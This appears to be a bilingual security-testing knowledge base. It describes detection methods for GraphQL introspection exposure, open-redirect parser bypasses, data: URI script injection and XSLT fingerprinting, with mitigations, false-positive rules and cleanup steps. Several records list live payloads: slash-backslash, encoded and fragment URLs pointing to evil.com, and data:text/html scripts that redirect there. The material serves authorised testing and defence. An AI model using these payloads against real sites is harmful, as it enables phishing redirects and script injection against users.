vulnerability.en: A production API that exposes a full schema with internal administrative types, deprecated fields, or sensitive operations to unauthorized users reduces attack cost, but disabling introspection does not replace resolver authorization. A finding requires schema exposure beyond policy or subsequent unauthorized field access.

exploitation.zh: 步骤一以管理员、低权限和匿名身份发送最小 __typename 查询记录协议基线；步骤二逐项回放原始内省查询并对 Schema 结果做结构化差异；步骤三抽样验证敏感字段 resolver 的授权，排除开发环境预期、客户端缓存 Schema 或错误消息补全建议造成的假阳性。
exploitation.en: First send a minimal __typename query as administrator, low-privilege user, and anonymous user. Replay each original introspection query and structurally diff the resulting schemas. Sample authorization on sensitive field resolvers to exclude expected development exposure, client-cached schemas, or error-message suggestions as false positives.

mitigation.zh: 按环境和身份明确内省策略并关闭不需要的生产探索功能；对每个 resolver 强制对象与字段级授权而非依赖隐藏 Schema；限制查询复杂度、记录内省行为，并在 Schema 发布流程中审查敏感类型。
mitigation.en: Define introspection policy by environment and identity and disable unneeded production exploration. Enforce object- and field-level authorization at every resolver instead of relying on hidden schema. Limit complexity, log introspection, and review sensitive types during schema publication.

title.zh: 固定身份化 Schema 基线

description.zh: 分别以管理员、低权限和匿名身份记录最小查询响应与允许的内省策略。
description.en: Record minimal-query responses and permitted introspection policy for administrator, low-privilege, and anonymous identities.

description.zh: 回放原始 __schema/__type 集合并比较类型、字段、参数和指令差异。
description.en: Replay the original __schema and __type set and compare types, fields, arguments, and directives structurally.

title.zh: 抽样验证 resolver 授权

description.zh: 对暴露的敏感字段执行无害读取对照，修复后确认内省策略与真实字段授权同时生效。
description.en: Run harmless read controls on exposed sensitive fields and confirm both introspection policy and field authorization after remediation.

review.rationale: 原始名称乱码且分类错误，实际是 GraphQL Schema 内省与身份化暴露测试，应归 API 安全。

prerequisites.zh: 已确认 GraphQL endpoint 和测试身份，服务端允许或部分允许 __schema/__type 内省，且不同角色的 schema 策略可比较。
prerequisites.en: A GraphQL endpoint and test identities are confirmed, the server permits or partially permits __schema or __type introspection, and schema policy can be compared across roles.

prerequisites.zh: 使用匿名、最低权限和授权管理测试身份执行有限内省，只保存类型/字段名称和访问决定，不查询业务对象数据。
prerequisites.en: Anonymous, least-privilege, and authorized administrator test identities run limited introspection, preserving only type or field names and access decisions without querying business objects.

analysis.zh: 阳性证据是目标服务器执行 __schema/__type 并向不应获知 schema 的身份返回类型、字段或参数；差异需与服务端角色策略关联。 假阳性边界：错误消息猜到字段、客户端缓存 schema、开发文档公开、仅 __typename 可用、管理身份正常内省、预生成 TypeScript 类型或静态控制台均不是未授权内省。
analysis.en: Positive evidence requires the target server to execute __schema or __type and return types, fields, or arguments to an identity that should not receive schema information, correlated with server role policy. False-positive boundary: Field guesses from errors, client-cached schema, public development docs, __typename only, legitimate administrator introspection, generated TypeScript types, or a static console does not prove unauthorized introspection.

opsecTips.zh: Schema 内省限制分页/深度和返回大小，不下载完整生产 schema；发现敏感描述、真实默认值、大响应、复杂度告警或用户数据时停止。
opsecTips.en: Schema introspection limits depth and response size and never downloads a full production schema; stop on sensitive descriptions, real default values, large responses, complexity alerts, or user data.

opsecTips.zh: 删除内省响应/本地 schema 缓存和测试 token，关闭会话，恢复角色策略并重放匿名与授权最小查询。
opsecTips.en: Delete introspection responses, local schema caches, and test tokens, close sessions, restore role policy, and replay minimal anonymous and authorized queries.

name.zh: GraphQL 操作类型暴露探测

description.zh: 验证 Query、Mutation 与 Subscription 根类型是否存在、可内省并按身份正确限制其操作面。
description.en: Tests whether Query, Mutation, and Subscription root types exist, are introspectable, and expose an operation surface appropriate to each identity.

overview.zh: 原集合以 __typename、queryType、mutationType 和 subscriptionType 识别 GraphQL 根操作。操作类型存在是正常设计信息，风险在于未授权身份可看到或调用管理 Mutation、调试 Query 或未经限制的 Subscription。
overview.en: The source uses __typename, queryType, mutationType, and subscriptionType to identify GraphQL root operations. The existence of an operation type is normal design information; risk arises when unauthorized identities can see or invoke administrative mutations, debug queries, or unrestricted subscriptions.

vulnerability.zh: Schema 可见性策略与 resolver 授权脱节时，隐藏操作可能仍可直接调用，公开操作也可能缺少对象级校验。探测只能建立攻击面，必须将根类型结果与实际身份、变量校验、状态变化和订阅数据关联。
vulnerability.en: When schema visibility and resolver authorization diverge, hidden operations may remain directly callable and visible operations may lack object-level checks. Discovery establishes only the surface and must be tied to identity, variable validation, state change, and subscription data.

exploitation.zh: 步骤一以多个身份执行 query{__typename} 并记录正常 data/errors；步骤二回放原始根类型查询，比较 Query、Mutation、Subscription 名称与可见性；步骤三对一个无害操作做授权对照并检查状态或事件，排除仅类型存在、统一 validation error 或网关缓存造成的假阳性。
exploitation.en: First execute query{__typename} under several identities and record normal data or errors. Replay the original root-type queries and compare Query, Mutation, and Subscription names and visibility. Run an authorization control on one harmless operation and inspect state or events to exclude mere type existence, uniform validation errors, or gateway caching as false positives.

mitigation.zh: 对 Query、Mutation 与 Subscription 的每个 resolver 独立授权；按身份最小化 Schema 可见性但不把隐藏当作安全控制；为写操作设置输入 Schema、幂等与审计，并限制订阅连接、事件过滤和查询复杂度。
mitigation.en: Authorize every Query, Mutation, and Subscription resolver independently. Minimize schema visibility by identity without treating hiding as a security control. Apply input schemas, idempotency, and auditing to writes and constrain subscription connections, event filtering, and query complexity.

description.zh: 以匿名、普通用户和管理员身份记录 __typename 与允许的根操作范围。
description.en: Record __typename and permitted root-operation scope for anonymous, ordinary-user, and administrator identities.

description.zh: 回放原始根类型探针并结构化比较每种身份下的名称、错误与可见性。
description.en: Replay the original root-type probes and structurally compare names, errors, and visibility across identities.

title.zh: 验证实际 resolver 边界

description.zh: 选择可回滚的读取或写入做授权对照，修复后确认 Schema 与运行时权限一致。
description.en: Use a reversible read or write authorization control and confirm schema visibility and runtime permission agree after remediation.

review.rationale: 该条是 GraphQL 根操作攻击面枚举，应从 SQL 注入迁到 API 安全并要求 resolver 级证据。

prerequisites.zh: 目标 GraphQL endpoint 已确认，Query/Mutation/Subscription 根类型的内省权限、传输协议和测试角色均可核验。
prerequisites.en: The target GraphQL endpoint is confirmed, with introspection permissions, transport protocols, and test roles for Query, Mutation, and Subscription root types verifiable.

prerequisites.zh: 每种操作只用 __typename 或专用无副作用 marker field，Mutation 不写业务数据，Subscription 使用隔离连接并记录 resolver/认证日志。
prerequisites.en: Each operation uses __typename or a dedicated side-effect-free marker field, mutations write no business data, and subscriptions use isolated connections with resolver and authentication logs.

analysis.zh: 阳性证据是目标身份可解析并到达某根操作 resolver，且暴露面超出设计角色；只确认根类型存在时应标记为信息而非漏洞。 假阳性边界：query/mutation/subscription 关键字被 parser 识别、__typename 返回根名、resolver 立即授权拒绝、WebSocket 握手失败或 schema 文档列出操作均不是越权。
analysis.en: Positive evidence requires the target identity to parse and reach a root-operation resolver beyond its designed role; confirmation that a root type merely exists is informational rather than a vulnerability. False-positive boundary: Parser recognition of operation keywords, a root name from __typename, immediate resolver authorization denial, failed WebSocket handshake, or operations listed in documentation does not prove unauthorized access.

opsecTips.zh: 根操作测试不执行真实 Mutation 或长时 Subscription；出现数据写入、事件广播、连接泄漏、复杂度增长、真实对象或服务压力时停止。
opsecTips.en: Root-operation testing never executes real mutations or long-lived subscriptions; stop on data writes, event broadcasts, leaked connections, complexity growth, real objects, or service pressure.

opsecTips.zh: 关闭 subscription/WebSocket 与测试会话，删除 marker resolver 记录，清理 GraphQL 缓存/事件队列并恢复操作级授权。
opsecTips.en: Close subscriptions, WebSockets, and test sessions, delete marker-resolver records, clear GraphQL caches and event queues, and restore operation-level authorization.

name.zh: 反斜杠 URL 解析差异重定向

description.zh: 验证应用、代理和浏览器对 /\、连续斜杠及反斜杠的规范化差异是否把看似站内路径解析为外部主机。
description.en: Tests whether applications, proxies, and browsers normalize slash and backslash combinations differently and turn an apparently internal path into an external host.

overview.zh: 原始短 ID 实际对应反斜杠和多斜杠重定向变体。不同 URL 解析器可能把反斜杠当普通路径字符或当作正斜杠，因而服务端 allowlist 的站内判断与浏览器最终主机不一致。
overview.en: This short source ID maps to backslash and repeated-slash redirect variants. URL parsers may treat a backslash as an ordinary path character or normalize it into a slash, causing server allowlist decisions to disagree with the browser's final host.

vulnerability.zh: 应用若在标准 URL 解析前用字符串前缀确认路径以 / 开头，浏览器随后对 /\evil.com 等形式做 authority 规范化，就可能离开可信源。必须观察真实 Location 和最终浏览器 URL，不能仅凭库函数返回值推断。
vulnerability.en: If an application checks that a path begins with slash before standard URL parsing, a browser may later normalize forms such as slash-backslash-host into an authority and leave the trusted origin. Real Location and final browser URL are required; a library return value alone is not enough.

exploitation.zh: 步骤一用 /account 记录应用和浏览器的站内解析基线；步骤二逐项回放原始反斜杠组合，保存校验器解析对象、响应 Location 与浏览器地址栏；步骤三在两个浏览器和标准 URL 解析器中对照，排除显示转义、代理自动纠正或根路径 404 造成的假阳性。
exploitation.en: First record application and browser parsing for an internal path such as /account. Replay each original backslash combination and preserve the validator's parsed object, response Location, and browser address bar. Compare two browsers and a standard URL parser to exclude display escaping, proxy correction, or a root-path 404 as false positives.

mitigation.zh: 拒绝重定向参数中的反斜杠、控制字符和协议相对形式；在一次规范化后用同一标准解析器校验并生成 Location；优先使用服务端目标 ID，同时对代理和支持浏览器建立解析差分回归。
mitigation.en: Reject backslashes, control characters, and scheme-relative forms in redirect input. Normalize once and use the same standard parser for validation and Location generation. Prefer server-side destination IDs and maintain parser-differential regressions across proxies and supported browsers.

description.zh: 保存正常相对路径在应用解析器、响应 Location 和支持浏览器中的结果。
description.en: Preserve results for a normal relative path in the application parser, response Location, and supported browsers.

description.zh: 回放原始组合并逐层记录 authority、host、path 和最终导航目标的差异。
description.en: Replay the original combinations and record authority, host, path, and final navigation differences at each layer.

attackChain.payload:
/\evil.com
/\//evil.com
/\///evil.com
/\////evil.com
/\/////evil.com
/\//////evil.com
/\///////evil.com
/\////////evil.com

description.zh: 采用目标映射或标准解析器后重放，确认站内路径正常且反斜杠外部目标稳定失败。
description.en: Replay after destination mapping or standard parsing to preserve internal paths while consistently rejecting backslash external targets.

review.rationale: 原内容是反斜杠 URL 规范化绕过，应从 SQL 注入纠正为开放重定向。

prerequisites.zh: 应用、代理和浏览器对反斜杠、/\、连续斜杠的 URL 规范化顺序不同，且该值最终进入重定向/导航 Sink。
prerequisites.en: Application, proxy, and browser normalize backslashes, slash-backslash pairs, and repeated slashes differently, and the value reaches a redirect or navigation sink.

prerequisites.zh: evil.com 替换为自有空源，逐层记录原始值、代理/框架规范值、Location 和浏览器最终 host，每个变体唯一 token。
prerequisites.en: evil.com is replaced by an owned empty origin, recording raw value, proxy and framework canonical values, Location, and browser final host per unique-token variant.

analysis.zh: 阳性证据是校验器把变体判为站内路径，而后续层/浏览器把反斜杠规范化为协议相对外部 host 并实际导航到自有源。 假阳性边界：反斜杠字符串回显、浏览器保持站内路径、服务器 404、Location 仍为相对路径、手工改 URL、不同浏览器理论差异或 WAF 放行均不是重定向。
analysis.en: Positive evidence requires validation to classify a variant as an internal path while a later layer or browser canonicalizes backslashes into a scheme-relative external host and navigates to the owned origin. False-positive boundary: Reflected backslashes, an internal browser path, server 404, a still-relative Location, manual URL edits, theoretical cross-browser differences, or WAF allowance does not prove redirect.

opsecTips.zh: 反斜杠差异测试只导航自有空页面一次；出现真实 query/凭据传递、重定向循环、非测试浏览器、公共域或下载时停止。
opsecTips.en: Backslash differential testing navigates once to an owned empty page only; stop on real query or credential transfer, redirect loops, nontest browsers, public origins, or downloads.

opsecTips.zh: 删除测试 URL/token，清理 history/BFCache/代理与 CDN 缓存、目标日志，恢复统一 URL parser 后回归。
opsecTips.en: Delete test URLs and tokens, clear history, BFCache, proxy and CDN caches plus destination logs, restore a unified URL parser, and regress.

name.zh: data: URI HTML 脚本注入

description.zh: 验证用户控制的 data:text/html URI 是否进入可导航或可嵌入浏览器 Sink，并执行内联脚本触发外部导航。
description.en: Tests whether a user-controlled data:text/html URI reaches a navigable or embeddable browser sink and executes inline script that triggers external navigation.

subCategory.zh: Data URI 活动内容执行

overview.zh: 原集合是明文与 Base64 编码的 data:text/html 文档，脚本在独立不透明源中执行并尝试导航。它与普通 URL 编码开放重定向不同，首先测试危险协议能否进入浏览器，随后才观察导航副作用。
overview.en: The source contains plain and Base64 data:text/html documents whose scripts run in an opaque origin and attempt navigation. Unlike ordinary encoded open redirects, it first tests whether a dangerous scheme reaches the browser and then observes navigation as a side effect.

vulnerability.zh: 应用只按域名字符串或前缀允许 URI，却不限制 scheme，或把 data: 写入 iframe、object、链接和 location 等危险属性时，会让攻击者控制完整活动文档。CSP、浏览器上下文和用户手势可能改变执行结果。
vulnerability.en: If an application validates only host strings or prefixes without restricting schemes, or writes data into iframe, object, link, or location sinks, an attacker can control an active document. CSP, browser context, and user-gesture requirements may change execution results.

exploitation.zh: 步骤一用 data:text/plain 建立无脚本显示基线；步骤二回放原始 HTML/Base64 URI，在真实 Sink 中记录最终协议、文档源、CSP 和导航事件；步骤三用纯文本上下文与禁用 data: 的策略对照，排除载荷只被显示、Base64 解码工具预览或浏览器阻断造成的假阳性。
exploitation.en: First establish a nonscript display baseline with data:text/plain. Replay the original HTML and Base64 URIs in the real sink and record final scheme, document origin, CSP, and navigation events. Compare plain-text context and a policy blocking data to exclude displayed payloads, decoder previews, or browser blocking as false positives.

mitigation.zh: 按业务只允许明确协议并默认拒绝 data:；在 DOM 属性赋值前使用标准 URL 解析器和 Trusted Types 等约束；部署限制 object-src、frame-src 和 script-src 的 CSP，并避免把用户数据作为完整导航目标。
mitigation.en: Allow only explicit business schemes and reject data by default. Use standard URL parsing and controls such as Trusted Types before DOM property assignment. Deploy CSP restrictions for object-src, frame-src, and script-src, and avoid treating user data as a complete navigation target.

title.zh: 确认 data URI 浏览器 Sink

description.zh: 记录 data:text/plain 在目标属性中的解析、文档源和是否需要用户手势。
description.en: Record parsing, document origin, and user-gesture requirements for data:text/plain in the target property.

description.zh: 回放原始 URI 并捕获文档创建、脚本执行、CSP 决策和最终导航事件。
description.en: Replay the original URIs and capture document creation, script execution, CSP decisions, and final navigation events.

attackChain.payload:
data:text/html,<script>window.location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+
data:text/html,<script>document.location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
data:text/html,<script>location.href='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwczovL2V2aWwuY29tJzwvc2NyaXB0Pg==

description.zh: 启用协议白名单和 CSP 后重放，确认允许链接保留而 data: 活动文档无法进入 Sink。
description.en: Replay after scheme allowlisting and CSP to preserve allowed links while preventing data active documents from reaching the sink.

review.rationale: data:text/html 载荷创建活动文档并执行脚本，应从 SQL 注入改归 XSS，而非仅看外部导航结果。

prerequisites.zh: 可控 data:text/html URI 进入 iframe/src、object/data、location 或链接等可导航/嵌入 Sink，浏览器策略允许创建活动文档。
prerequisites.en: A controlled data:text/html URI reaches a navigable or embeddable sink such as iframe src, object data, location, or link, and browser policy permits an active document.

prerequisites.zh: data 文档只设置固定 marker 或导航到自有空页面，记录创建文档 origin、CSP、sandbox、触发动作和调用栈。
prerequisites.en: The data document only sets a fixed marker or navigates to an owned empty page, recording document origin, CSP, sandbox, trigger action, and call stack.

analysis.zh: 阳性证据是应用把可控 data URI 交给活动文档 Sink，目标浏览器解析 HTML 并执行 marker/受控导航，执行上下文明确。 假阳性边界：data URI 只显示/下载、浏览器阻止顶层 data 导航、iframe sandbox 禁脚本、Base64 可解码、源码含 script 或用户手工粘贴地址均不是应用注入。
analysis.en: Positive evidence requires the application to pass the controlled data URI into an active-document sink and the target browser to parse HTML and execute the marker or controlled navigation, with execution context identified. False-positive boundary: A displayed or downloaded data URI, browser-blocked top-level data navigation, sandboxed script denial, decodable Base64, script text in source, or manual address-bar pasting does not prove application injection.

opsecTips.zh: Data URI 测试不读取父页数据或导航公共域；出现 top/opener 访问、下载、外连、历史污染、窗口打开或非测试会话时停止。
opsecTips.en: Data URI testing never reads parent-page data or navigates to public origins; stop on top or opener access, downloads, egress, history contamination, window opening, or a nontest session.

opsecTips.zh: 移除 URI/iframe/object 和 marker，关闭目标页，清理 history/BFCache/站点数据与浏览器日志，并恢复 scheme allowlist。
opsecTips.en: Remove URIs, frames, objects, and markers, close target pages, clear history, BFCache, site data, and browser logs, and restore the scheme allowlist.

name.zh: 百分号编码开放重定向绕过

description.zh: 验证重定向校验器是否在百分号解码前检查目标，导致编码后的协议、双斜杠或外部主机在后续解析阶段生效。
description.en: Tests whether a redirect validator checks a destination before percent decoding and lets an encoded scheme, double slash, or external host become effective during later parsing.

overview.zh: 原命令把 http/https、://、// 和外部主机进行百分号编码，测试安全校验与 Location 生成之间的解码顺序。只有应用接受编码值并让浏览器最终导航到外部主机，才构成重定向绕过。
overview.en: The source percent-encodes HTTP or HTTPS, separators, double slashes, and an external host to test decode ordering between validation and Location generation. It is a redirect bypass only when the application accepts the encoded value and the browser ultimately navigates externally.

vulnerability.zh: 若 WAF 或应用在未解码字符串上匹配主机，而框架、代理或浏览器随后执行一次解码，校验器看到的相对路径可能变成协议相对或绝对 URL。重复解码还会扩大差异，因此必须记录每层规范化值。
vulnerability.en: If a WAF or application matches hosts on undecoded text while a framework, proxy, or browser decodes later, a value seen as a relative path can become a scheme-relative or absolute URL. Repeated decoding widens the differential, so each layer's normalized value must be recorded.

exploitation.zh: 步骤一用未编码站内路径和外部绝对 URL 建立允许/拒绝基线；步骤二逐项回放原始编码变体，记录 WAF、应用、Location 与浏览器最终 URL；步骤三用只解码一次的标准解析器对照，排除日志显示解码、浏览器地址栏美化或代理统一编码造成的假阳性。
exploitation.en: First establish allow and deny baselines with an unencoded internal path and external absolute URL. Replay each original encoded variant and record WAF, application, Location, and browser final URL values. Compare a standard parser that decodes once to exclude decoded log display, browser address-bar prettification, or proxy re-encoding as false positives.

mitigation.zh: 在边界只进行一次严格规范化并拒绝非法编码；使用同一标准 URL 对象完成校验和 Location 生成，精确 allowlist 协议、主机与端口；避免多层重复解码，并用编码与未编码成对用例回归。
mitigation.en: Normalize exactly once at the boundary and reject invalid encoding. Use the same standard URL object for validation and Location generation and exactly allowlist scheme, host, and port. Avoid repeated decoding and regress paired encoded and unencoded cases.

description.zh: 保存站内与外部未编码目标在 WAF、应用和浏览器中的规范化结果。
description.en: Preserve normalized results for unencoded internal and external destinations at WAF, application, and browser layers.

title.zh: 追踪编码目标跨层变化

description.zh: 回放原始百分号集合并记录每层输入、解码次数、Location 以及最终主机。
description.en: Replay the original percent-encoded set and record each layer's input, decode count, Location, and final host.

title.zh: 统一 URL 对象回归

description.zh: 统一规范化与 allowlist 后重放，确认站内编码路径可用且外部目标稳定拒绝。
description.en: Replay after unified normalization and allowlisting to preserve encoded internal paths while consistently rejecting external targets.

review.rationale: 原集合测试百分号解码顺序造成的外部导航，应从 SQL 注入纠正为开放重定向规范化绕过。

prerequisites.zh: 重定向校验在 percent-decoding 前运行，而代理/框架/浏览器随后解码并解析协议、双斜杠或 host，解码次数可观察。
prerequisites.en: Redirect validation runs before percent decoding while a proxy, framework, or browser later decodes and parses scheme, double slashes, or host, with decode count observable.

prerequisites.zh: 编码目标指向自有空源并带唯一 token，保存原始编码、每层解码值、Location 和浏览器最终 URL，准备同源编码对照。
prerequisites.en: The encoded target points to an owned empty origin with a unique token, preserving raw encoding, each decoded value, Location, and browser final URL, with an encoded same-origin control.

analysis.zh: 阳性证据是第一层校验接受编码值，后续解码恢复外部绝对/协议相对 URL，并使浏览器实际导航到自有源。 假阳性边界：percent 字符串回显、只解码为站内路径、Location 保持编码、浏览器不二次解码、服务器 400、手工解码结果或外部文本在 query 中均不是绕过。
analysis.en: Positive evidence requires first-layer validation to accept the encoded value, later decoding to restore an external absolute or scheme-relative URL, and the browser to navigate to the owned origin. False-positive boundary: Reflected percent text, decoding only to an internal path, an encoded Location, no browser secondary decode, HTTP 400, manual decoded output, or external text inside a query does not prove bypass.

opsecTips.zh: 百分号重定向测试只到自有空源，禁止凭据/query 外带；出现解码循环、公共域、真实用户导航、下载或代理错误增长时停止。
opsecTips.en: Percent-encoded redirect testing uses an owned empty origin only and forbids credential or query leakage; stop on decode loops, public origins, real-user navigation, downloads, or proxy-error growth.

opsecTips.zh: 删除编码 token 和目标日志，清理浏览器/代理/CDN 缓存及 history，恢复完整解码后校验并重放基线。
opsecTips.en: Delete encoded tokens and destination logs, clear browser, proxy, and CDN caches plus history, restore validation after full decoding, and replay baselines.

name.zh: 双重 URL 解码开放重定向

description.zh: 验证代理与应用连续两次 URL 解码时，双重编码的外部目标是否绕过第一层校验并在后续阶段成为有效跳转。
description.en: Tests whether double-encoded external destinations bypass first-layer validation and become valid redirects when a proxy and application decode consecutively.

overview.zh: 原值以 %25 表示百分号，需要至少两次解码才显现协议或双斜杠。它用于定位 CDN、WAF、框架与路由器之间的重复规范化，而不是普通 URL 编码功能测试。
overview.en: The values encode percent signs as %25 and require at least two decodes before a scheme or double slash appears. They locate repeated normalization across CDN, WAF, framework, and router layers rather than testing ordinary URL encoding.

vulnerability.zh: 第一层安全检查若只看到仍编码的安全字符串，而下游组件再次解码并生成 Location，最终目标会改变。修复不能简单再增加一次解码，否则可能产生第三层差异；必须明确定义唯一规范化边界。
vulnerability.en: If the first security check sees a still-encoded safe string while a downstream component decodes again before generating Location, the final destination changes. Adding another decode is not a fix because it can create a third differential; one canonicalization boundary must be defined.

exploitation.zh: 步骤一分别发送明文、一次编码和双重编码的站内目标记录解码链；步骤二回放原始双重编码外部目标并保存每层原始值、规范化值和最终浏览器主机；步骤三移除下游重复解码后复测，排除日志自动解码、客户端预解码或普通 302 缓存造成的假阳性。
exploitation.en: First send plain, once-encoded, and twice-encoded internal destinations to map the decode chain. Replay the original twice-encoded external targets and preserve raw and normalized values at each layer plus the final browser host. Retest after removing downstream repeated decoding to exclude log auto-decoding, client pre-decoding, or ordinary cached 302 responses as false positives.

mitigation.zh: 在受信边界严格解码一次并传递结构化 URL，而不是继续传递字符串；拒绝残留或非法百分号编码并阻止下游重复解码；校验最终协议、主机和端口，针对 0/1/2 次编码建立矩阵回归。
mitigation.en: Decode exactly once at the trust boundary and pass a structured URL rather than the original string. Reject residual or invalid percent encodings and prevent downstream decoding. Validate final scheme, host, and port and maintain a zero, one, and two-decode regression matrix.

description.zh: 使用站内目标的明文、一次和两次编码变体记录每个组件的输入输出。
description.en: Use plain, once-encoded, and twice-encoded internal targets to record each component's input and output.

title.zh: 触发双重编码外部导航

description.zh: 回放原始集合并关联代理日志、应用 Location 与真实浏览器最终主机。
description.en: Replay the original set and correlate proxy logs, application Location, and the real browser's final host.

description.zh: 移除重复解码并传递结构化 URL 后重放矩阵，确认目标在所有层保持一致。
description.en: Remove repeated decoding, pass a structured URL, and replay the matrix to confirm the destination remains identical at every layer.

review.rationale: 双重百分号编码测试代理与应用重复解码后的跳转目标变化，真实分类是开放重定向。

prerequisites.zh: 请求值会经过两个独立解码层（如边缘与应用），第一层校验只看一次解码结果，第二层结果最终进入重定向 Sink。
prerequisites.en: A request value crosses two independent decoding layers, such as edge and application, where validation sees only the first decode and the second result reaches a redirect sink.

prerequisites.zh: 双编码 URL 只指向自有空源，逐层记录 raw、decode1、decode2、校验决定、Location 和最终 host，并与单编码/站内值对照。
prerequisites.en: Double-encoded URLs point only to an owned empty origin, recording raw, first and second decode, validation decision, Location, and final host with single-encoded and internal controls.

analysis.zh: 阳性证据是 decode1 仍呈无害编码值并通过校验，decode2 恢复外部 URL，最终响应/浏览器导航到自有源。 假阳性边界：应用只解码一次、双编码原样进入 Location、decode2 发生在测试脚本而非服务器/浏览器、400/404、外部字符串留在路径或普通跳转均不是双解码绕过。
analysis.en: Positive evidence requires the first decode to remain harmless-looking and pass validation, the second decode to restore an external URL, and the final response or browser to navigate to the owned origin. False-positive boundary: Single application decoding, a double-encoded Location, second decoding only in the test script, HTTP 400 or 404, external text remaining in a path, or an ordinary redirect does not prove double-decoding bypass.

opsecTips.zh: 双重解码测试限制少量变体且只到自有源；出现解码递归、缓存键分裂、公共域、敏感参数传递或用户流量时停止。
opsecTips.en: Double-decoding testing limits variants and uses an owned origin only; stop on recursive decoding, cache-key splitting, public origins, sensitive-parameter transfer, or user traffic.

opsecTips.zh: 删除双编码 token/日志，purge 相关缓存键，清理 history/BFCache，统一解码责任并在规范化后回归校验。
opsecTips.en: Delete double-encoded tokens and logs, purge related cache keys, clear history and BFCache, unify decoding responsibility, and regress validation after canonicalization.

name.zh: URL Fragment 主机校验混淆

description.zh: 验证重定向校验是否把 # 后片段误当主机或路径的一部分，造成校验器与浏览器对可信目标的不同判断。
description.en: Tests whether redirect validation mistakes text after a fragment marker for part of the host or path and disagrees with the browser about the trusted destination.

overview.zh: Fragment 不会随 HTTP 请求发送，浏览器把 # 后内容用于客户端定位。原集合测试直接、一次编码和双重编码的 # 是否在不同层被错误参与主机 allowlist。单独访问 target.com#evil.com 通常仍是站内，不应误报。
overview.en: Fragments are not sent in HTTP requests and browsers use text after # for client-side location. The source tests whether direct, once-encoded, and twice-encoded fragment markers are incorrectly included in host allowlisting. Visiting target.com#evil.com normally remains on target.com and must not be misreported.

vulnerability.zh: 漏洞只在某层先错误校验整体字符串，另一层解码或重组后把不同部分当作 authority 时成立。通常片段只是无害噪声，因此必须通过最终 URL 对象的 scheme、host、path 和 fragment 证明外部主机确实改变。
vulnerability.en: A flaw exists only when one layer validates the whole string incorrectly and another layer decodes or reconstructs it into a different authority. Fragments are usually harmless noise, so the final URL object's scheme, host, path, and fragment must prove an actual host change.

exploitation.zh: 步骤一用标准解析器记录原始三种值的 scheme、host、path 和 fragment；步骤二将它们输入真实重定向流程并捕获每一跳 Location 与浏览器 URL 对象；步骤三与无重定向普通链接对照，排除地址栏显示、日志截断或扫描器看到 evil.com 字符串造成的假阳性。
exploitation.en: First record scheme, host, path, and fragment for all three source values using a standard parser. Feed them into the real redirect flow and capture every Location and browser URL object. Compare an ordinary nonredirecting link to exclude address-bar display, log truncation, or scanner matches on the evil.com string as false positives.

mitigation.zh: 在校验前使用标准 URL 解析器并只对解析后的 host、scheme 和 port 做决定；明确忽略或业务化处理 fragment，拒绝重复编码和多层重组；让校验与 Location 生成复用同一 URL 对象并加入无害片段对照。
mitigation.en: Parse with a standard URL library before validation and decide only on parsed host, scheme, and port. Ignore or explicitly handle fragments, reject repeated encoding and multilayer reconstruction, and reuse the same URL object for validation and Location generation with harmless-fragment controls.

title.zh: 解析 Fragment 对照对象

description.zh: 用标准库输出原始值的协议、主机、路径与片段，先确认默认行为仍为站内。
description.en: Use a standard library to output scheme, host, path, and fragment and first confirm the default behavior remains internal.

description.zh: 回放原始 Fragment 变体并捕获服务端解析对象、Location 和浏览器最终 URL。
description.en: Replay the original fragment variants and capture the server parse object, Location, and browser final URL.

attackChain.payload:
https://target.com#evil.com
https://target.com%23evil.com
https://target.com%2523evil.com

description.zh: 修复为单一 URL 对象后重放，只有最终 host 外移才保留发现，否则记录为无害对照。
description.en: Replay with one URL object and retain a finding only if final host changes; otherwise record the case as a harmless control.

review.rationale: 该条属于开放重定向解析边界测试，但大多数 Fragment 只是无害对照，教程必须防止把字符串命中误报为外部跳转。

prerequisites.zh: 重定向校验器与最终 URL consumer 对 #、%23 和双编码片段的边界处理可能不同，且每层解析后的 scheme/host/path 可记录。
prerequisites.en: Redirect validation and the final URL consumer may treat #, %23, and double-encoded fragments differently, with parsed scheme, host, and path observable at every layer.

prerequisites.zh: target/evil 均替换为自有测试 host，保存 raw、解码值、校验器 host、Location 与浏览器最终 host；使用标准 URL parser 作为对照。
prerequisites.en: Target and evil hosts are replaced by owned test hosts, preserving raw and decoded values, validator host, Location, and browser final host, with a standard URL parser as control.

analysis.zh: 阳性证据是校验器因错误处理 fragment 接受目标，而后续转换使片段外字符串成为实际 authority 并让浏览器导航到自有外部 host。 假阳性边界：标准 https://target#evil 中浏览器仍访问 target、片段不发送给服务器、DOM 显示 evil、%23 保持路径字符、服务器忽略 fragment 或理论解析差异均不是重定向。
analysis.en: Positive evidence requires fragment mishandling to make validation accept the target while later transformation turns attacker-controlled text into the actual authority and navigates the browser to the owned external host. False-positive boundary: A standard https://target#evil URL still visiting target, fragments not sent to servers, evil displayed in the DOM, %23 remaining a path character, server fragment ignorance, or theoretical parser differences does not prove redirect.

opsecTips.zh: Fragment 测试只使用自有 host 且单次导航；出现真实 query/凭据、公共域、解码循环、用户历史污染或非测试页面跳转时停止。
opsecTips.en: Fragment testing uses owned hosts and one navigation only; stop on real queries or credentials, public origins, decode loops, user-history contamination, or nontest-page navigation.

opsecTips.zh: 删除测试 URL/token 和目标日志，清理 history/BFCache/缓存，统一使用结构化 URL parser 校验 host 后回归。
opsecTips.en: Delete test URLs, tokens, and destination logs, clear history, BFCache, and caches, adopt structured URL-parser host validation, and regress.

name.zh: XSLT 处理器属性指纹识别

description.zh: 通过 system-property 查询 vendor、version 和 vendor-url，识别实际 XSLT 引擎及其能力基线。
description.en: Uses system-property queries for vendor, version, and vendor-url to identify the active XSLT engine and establish a capability baseline.

overview.zh: 原样式表只读取标准 XSLT 系统属性，不执行命令也不读取文件。它是后续选择引擎专用安全测试的指纹探针，应从 SQL 注入和 RCE 区分，并以服务端实际转换输出确认。
overview.en: The source stylesheets read standard XSLT system properties and do not execute commands or read files. They are fingerprint probes for selecting later engine-specific security tests and should be separated from SQL injection and RCE, with confirmation from actual server transform output.

